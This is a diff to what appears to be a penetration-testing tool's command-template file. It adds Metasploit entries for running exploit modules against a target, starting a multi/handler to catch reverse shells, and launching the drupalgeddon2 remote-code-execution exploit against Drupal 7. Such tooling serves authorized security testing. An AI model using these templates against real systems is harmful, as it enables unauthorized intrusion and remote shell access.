@@ -797,3 +797,39 @@ name = "gtfobins hint"
 description = "reminder — check GTFOBins for a sudo/SUID binary"
 template = "echo 'https://gtfobins.github.io/#<FILE>'"
 tags = ["privesc", "gtfobins", "reference"]
+
+# ───────────────────────── metasploit ─────────────────────────
+[[command]]
+category = "msf"
+name = "msfconsole"
+description = "launch metasploit — press i in the run pane to interact"
+template = "msfconsole -q"
+tags = ["msf", "exploit"]
+
+[[command]]
+category = "msf"
+name = "run module"
+description = "use a module, set RHOST/LHOST, fire it (non-interactive)"
+template = "msfconsole -q -x 'use <MODULE>; set RHOSTS <RHOST>; set LHOST <LHOST>; run; exit -y'"
+tags = ["msf", "exploit"]
+
+[[command]]
+category = "msf"
+name = "multi/handler"
+description = "catch a meterpreter/shell payload"
+template = "msfconsole -q -x 'use exploit/multi/handler; set payload <PAYLOAD>; set LHOST <LHOST>; set LPORT <LPORT>; run'"
+tags = ["msf", "listener", "handler"]
+
+[[command]]
+category = "msf"
+name = "search"
+description = "search modules by term"
+template = "msfconsole -q -x 'search <DATA>; exit -y'"
+tags = ["msf"]
+
+[[command]]
+category = "msf"
+name = "drupalgeddon2"
+description = "Drupal 7 <7.58 unauthenticated RCE"
+template = "msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <RHOST>; set LHOST <LHOST>; run'"
+tags = ["msf", "web", "drupal", "rce"]
